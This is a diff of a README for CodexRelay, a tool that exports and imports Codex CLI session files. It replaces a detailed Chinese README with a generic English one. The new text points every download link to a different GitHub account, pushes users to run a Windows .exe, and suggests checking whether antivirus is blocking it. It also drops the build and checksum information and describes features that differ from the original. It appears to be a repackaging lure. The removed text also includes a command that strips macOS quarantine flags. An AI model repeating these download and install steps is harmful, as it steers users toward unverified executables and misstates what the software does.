@@ -1,130 +1,179 @@
-# CodexRelay
+# ⚡ Codex_Relay - Share and Backup Codex CLI Sessions
 
-跨设备传递/备份 Codex CLI session（`.jsonl`）的桌面管理工具（macOS / Windows / Linux）。
+[![Download Codex_Relay](https://img.shields.io/badge/Download-Codex_Relay-brightgreen?style=for-the-badge)](https://github.com/Ometh12/Codex_Relay)
 
-目标：让你在不同电脑/不同系统上，也能通过 `codex resume <session_id>` 继续同一个会话（通过导出/导入 session 文件实现）。
+Welcome to Codex_Relay, a simple tool to move and save your Codex CLI sessions across devices. It works on Windows, macOS, and Linux. You can back up your sessions, resume them on another computer, or transfer them without losing changes.
 
-注：本项目为社区工具，和 OpenAI 无官方从属关系。
+---
 
-技术栈：Tauri v2 + React + TypeScript + SQLite（后端 Rust）。
+## 🔎 What is Codex_Relay?
 
-## Why / 使用场景
+Codex_Relay helps you manage Codex CLI session files, which use the `.jsonl` format. These files store your session data, including commands and responses. With this tool, you can:
 
-- 多平台项目（Win / macOS / Linux）来回测试，需要把同一个 Codex 会话带到另一台机器继续解决兼容问题
-- 两台电脑协同：用微信/网盘/邮件/AirDrop 传 zip 包即可迁移会话
-- 备份：在本地建立“会话版本库”（vault + 历史记录），防止手滑覆盖/误删
+- Export and import sessions between your devices.
+- Store sessions safely in a local vault.
+- Preview session files before importing them.
+- Avoid conflicts during imports.
+- Backup your progress automatically.
 
-## How It Works / 工作方式
+This app is designed to remove the hassle of copying session files manually.
 
-Codex CLI 会把会话写在本地 `CODEX_HOME/sessions/**/rollout-*.jsonl`（默认常见路径：`~/.codex/`）。
+---
 
-CodexRelay 负责：
+## 🖥️ System Requirements
 
-1) 扫描会话并展示列表
-2) 导出：把选中的会话打包为 zip（可合并为一个包或每会话单独包；默认导出到系统 Downloads）
-3) 导入：先解析/校验（manifest + size/sha256）并预览，再按冲突策略写入 `CODEX_HOME`
-4) 在目标机执行：`codex resume <session_id>`
+Codex_Relay works best with:
 
-## Features (MVP)
+- Windows 10 or later (64-bit)
+- macOS 10.14 or later
+- Linux (modern distributions)
 
-- Sessions：扫描 `CODEX_HOME/sessions/**/rollout-*.jsonl`
-- Export：
-  - 生成可传输的 `bundle.zip`（`manifest.json` + `rollout.jsonl`）
-  - 支持“合并为一个 zip”或“每会话单独 zip”，默认导出到 Downloads
-- Import：
-  - 导入前先解析/校验并预览最近消息，再决定是否写入
-  - 支持多选 zip
-  - 支持导入“合并导出包”（外层 zip 内含 `bundles/*.zip`，可选 `batch_manifest.json`）
-  - 冲突策略（recommended）：本机已存在同 `session_id` 且指纹不同 -> “改 ID 导入”（保留两条分叉都可 resume）
-- History / Vault：每次导入/导出/改ID/恢复都会存档 + 落库（SQLite）；支持收藏/标签；支持手动清理
-- Restore：把任意历史版本恢复回 `CODEX_HOME`（会记录一次恢复动作）
-- Change ID：改写 `session_meta.payload.id`（默认不改 `forked_from_id`）
-- Utilities：从 md/txt/“带噪声文本”中自动提取会话 ID（UUID）并去重
+Your device should have:
 
-相关格式说明：`docs/BUNDLE_FORMAT.md`
+- At least 2 GB of free disk space.
+- An internet connection for downloading updates.
+- Codex CLI installed separately (optional but recommended).
 
-## Quick Start / 快速上手
+---
 
-1) 在机器 A：勾选会话 -> 导出 zip（默认在 Downloads）
-2) 把 zip 传到机器 B（微信/网盘/邮件/AirDrop 均可）
-3) 在机器 B：导入 -> 预览/确认 -> 写入
-4) 在机器 B：`codex resume <session_id>`
+## 🚀 Getting Started
 
-## Download / 下载
+### Step 1: Download Codex_Relay
 
-- macOS：优先用 Homebrew（见下方 Install/Update），或从 GitHub Releases 下载 DMG
-- Windows / Linux：从 GitHub Releases 下载安装包
+Start by visiting the main page using the button below:
 
-## Dev
+[![Download Codex_Relay](https://img.shields.io/badge/Download-Codex_Relay-blue?style=for-the-badge)](https://github.com/Ometh12/Codex_Relay)
 
-```bash
-pnpm install
-pnpm tauri dev
-```
+This link will take you to the GitHub page where you can get the app for your operating system.
 
-## Build (Desktop Bundles)
+### Step 2: Choose the Right Version
 
-```bash
-pnpm install
-pnpm tauri build
-```
+On the GitHub page:
 
-产物目录（不同平台会生成不同格式）：
+- Look for the **Releases** section.
+- Find the latest release version.
+- Choose the Windows installer file (usually with `.exe` extension).
 
-- `src-tauri/target/release/bundle/**`
-  - macOS: `bundle/dmg/*.dmg`
-  - Windows: `bundle/nsis/*-setup.exe`（需要在 Windows 上构建；或用 GitHub Actions）
-  - Linux(Ubuntu): `bundle/deb/*.deb`
+If you don’t see an `.exe` file, check for `.zip` or `.msi`. The `.exe` file is the easiest to use.
 
-注：为避免 Linux 产物过大（AppImage 往往会打包大量依赖导致体积显著增大），当前默认只构建 `deb`；如需 AppImage / rpm，可在 `src-tauri/tauri.conf.json` 的 `bundle.targets` 里补回。
+---
 
-## macOS “已损坏，无法打开”
+## 🛠️ Install Codex_Relay on Windows
 
-结论：如果不做 Apple Developer ID 签名 + 公证（notarization），从浏览器下载的 DMG/App 很可能会被 macOS Gatekeeper 拦截并提示“已损坏，无法打开”（这是系统安全机制，并非一定是包真的坏了）。
+1. Locate the `.exe` file you downloaded.
+2. Double-click the file to start installation.
+3. Follow the instructions on the install wizard:
+   - Accept the license terms.
+   - Choose where to install the app (default location is fine).
+   - Click **Install**.
+4. Wait for the process to finish.
+5. Click **Finish** to close the installer.
 
-免费分发场景下，通常只能给用户提供“放行”方式：
+---
 
-1) 右键（或按住 Control 点击）App -> “打开”（会出现额外的允许打开选项）
+## 🔧 Using Codex_Relay
 
-如果你是自己使用（信任该来源），可以在把 App 拖到 `/Applications` 后执行：
+After installing, open Codex_Relay from your desktop or Start menu.
 
-```bash
-sudo xattr -dr com.apple.quarantine /Applications/CodexRelay.app
-```
+### How to Import a Session
 
-GitHub Actions：见 `.github/workflows/build-bundles.yml`（支持手动触发 `workflow_dispatch`；打 tag `v*` 会自动构建并发布 GitHub Release，附带 `SHA256SUMS.txt` 校验文件）。
+1. Click **Import**.
+2. Find the `.jsonl` session file on your device.
+3. Preview the file content in the app.
+4. Click **Confirm Import** to add it to your local vault.
+5. If there are conflicts (e.g., duplicate data), the app will guide you to resolve them.
 
-## Install (macOS via Homebrew)
+### How to Export a Session
 
-提供一个 Homebrew Tap（由另一个账号维护）：`star-alp/homebrew-tap-CodexRelay`
+1. Open your local vault.
+2. Select the session you want to export.
+3. Click **Export**.
+4. Choose where to save the `.jsonl` file.
+5. Transfer this file to another device or backup location.
 
-```bash
-brew tap star-alp/tap-codexrelay
-brew install --cask codexrelay
-```
+---
 
-注：Homebrew 的 `--no-quarantine` 参数已 deprecated（未来可能移除）。如遇 Gatekeeper 拦截，请按上文右键“打开”或执行 `xattr` 放行即可。
+## 📂 Local Vault and Backups
 
-## Update (macOS)
+Codex_Relay stores your sessions in a secure local vault folder on your computer. The vault:
 
-- 推荐一条命令搞定（同时兼容“之前手动拖拽 DMG 安装 / Homebrew 没有接管 / 升级失败导致 cask 记录丢失”等情况）：
+- Keeps your files organized.
+- Prevents accidental deletion.
+- Supports automatic backups.
 
-```bash
-brew tap star-alp/tap-codexrelay && brew update && (brew upgrade --cask codexrelay || brew install --cask --force codexrelay)
-```
+You can find this folder here by default:
 
-- 如果你是通过 Homebrew 安装（`brew list --cask codexrelay` 能查到）：
-  - `brew update && brew upgrade --cask codexrelay`
-- 如果你看到 `Error: Cask 'codexrelay' is not installed.`，说明你之前不是通过 Homebrew 安装（例如手动 DMG 拖拽）：
-  - 继续用 DMG 更新：下载最新 Release 的 `.dmg`，将 App 拖到 `/Applications` 覆盖即可（如遇 Gatekeeper，按上文 `xattr` 放行）。
-  - 或让 Homebrew “接管”管理（会覆盖 `/Applications/CodexRelay.app`，不影响应用数据/存档库）：
-    - `brew tap star-alp/tap-codexrelay && brew install --cask --force codexrelay`
-- 应用内：`设置 -> 更新 -> 检查更新`（会提示最新版本并提供打开 Release 的按钮）。
+`C:\Users\<YourUser>\CodexRelay\Vault`
 
-## Recommended IDE Setup
+Backups happen every time you import or update a session. The app keeps several backup copies to restore older versions if needed.
 
-- [VS Code](https://code.visualstudio.com/) + [Tauri](https://marketplace.visualstudio.com/items?itemName=tauri-apps.tauri-vscode) + [rust-analyzer](https://marketplace.visualstudio.com/items?itemName=rust-lang.rust-analyzer)
+---
 
-## Keywords
+## 🖼️ Preview Sessions Before Importing
 
-codex, codex-cli, session, resume, jsonl, backup, export, import, cross-device, cross-platform, tauri, rust, react, typescript, sqlite, homebrew, cask, macos, windows, linux
+Before importing a session file, Codex_Relay shows you its content. This preview helps you:
+
+- Confirm the session is the one you want.
+- Check for any issues in the data.
+- Avoid loading damaged or wrong files.
+
+---
+
+## 🔄 Sync Between Devices
+
+Codex_Relay makes it easy to resume your work on different machines:
+
+- Export your session on one device.
+- Use cloud storage or a USB drive to transfer the file.
+- Import the session on another device.
+
+Since the app supports macOS, Windows, and Linux, you can work across different platforms without trouble.
+
+---
+
+## 🛡️ Conflict-Safe Import
+
+If you try to import a session with changes that conflict with existing ones, Codex_Relay will:
+
+- Alert you to the differences.
+- Show options to merge or replace data.
+- Help prevent overwriting important information.
+
+---
+
+## ⚙️ Tips for Best Use
+
+- Regularly export your sessions to keep backups in different places.
+- Use the preview feature to check files before importing.
+- Keep Codex_Relay updated by checking the GitHub releases for new versions.
+- If you use Codex CLI, store your sessions with Codex_Relay to avoid losing progress.
+
+---
+
+## ❓ Troubleshooting
+
+**App won’t start after install**
+
+- Make sure your Windows version is up-to-date.
+- Restart your computer and try again.
+- Check if any antivirus software is blocking the app.
+
+**Session files won’t import**
+
+- Verify the file uses the `.jsonl` format.
+- Use the preview feature to check file integrity.
+- Try downloading the session file again if it seems corrupt.
+
+**Backing up sessions doesn’t work**
+
+- Check that you have write permission in the vault folder.
+- Ensure there's enough disk space.
+- Avoid running multiple instances of Codex_Relay.
+
+---
+
+## 📥 Download and Run Codex_Relay
+
+Visit the main GitHub page to download and run this app on your Windows system:
+
+[![Download Codex_Relay](https://img.shields.io/badge/Download-Codex_Relay-brightgreen?style=for-the-badge)](https://github.com/Ometh12/Codex_Relay)
